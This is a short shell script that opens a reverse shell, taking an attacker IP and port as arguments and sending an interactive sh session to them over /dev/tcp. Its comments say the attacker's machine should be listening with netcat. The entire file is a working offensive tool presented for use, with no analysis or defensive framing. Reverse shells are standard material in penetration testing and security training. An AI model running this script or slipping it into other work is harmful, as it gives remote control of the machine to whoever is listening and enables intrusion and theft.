#!/bin/sh

# Argument 1 = attacker ip, Argument 2 = attacker port
# The machine being connected to should be listening using netcat, or similar

sh -i >& /dev/tcp/$1/$2 0>&1 2>&1
